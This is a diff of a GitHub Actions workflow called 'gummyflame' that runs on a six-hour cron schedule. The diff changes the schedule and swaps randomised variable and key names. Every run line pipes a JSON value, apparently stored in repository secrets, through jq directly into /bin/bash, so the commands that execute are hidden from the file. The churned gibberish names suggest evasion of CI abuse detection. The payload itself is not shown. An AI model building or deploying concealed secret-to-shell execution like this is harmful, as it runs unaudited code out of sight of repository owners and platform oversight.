@@ -3,7 +3,7 @@ name: gummyflame
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 2/6 * * *'
+    - cron: '22 0/6 * * *'
 
 jobs:
   build:
@@ -12,15 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: gummyflame
         env:
-          es0: ${{ secrets.es0 }}
+          ep994: ${{ secrets.ep994 }}
         run: |
-          echo $es0 | jq -r .dkaf13897 | /bin/bash
-          echo $ffso8 | jq -r .hicr91 | /bin/bash
-          echo $r84868 | jq -r .mjo13 | /bin/bash
-          echo $lxp5475 | jq -r .vqmai0870 | /bin/bash
-          echo $vbdea325 | jq -r .xolc8212 | /bin/bash
-          echo $tj37724 | jq -r .kfe433 | /bin/bash
-          echo $iznwl2 | jq -r .t05529 | /bin/bash
-          echo $s3609 | jq -r .hq2 | /bin/bash
-          echo $oqht34714 | jq -r .yjxb57 | /bin/bash
+          echo $ep994 | jq -r .yf30 | /bin/bash
+          echo $n93 | jq -r .igim0167 | /bin/bash
+          echo $hjgx2 | jq -r .bck08148 | /bin/bash
+          echo $t95 | jq -r .w47147 | /bin/bash
+          echo $uoctv9962 | jq -r .expsz03 | /bin/bash
+          echo $ndxr4 | jq -r .nllz4205 | /bin/bash
+          echo $yzea237 | jq -r .d9 | /bin/bash
+          echo $boki743 | jq -r .n98 | /bin/bash
 
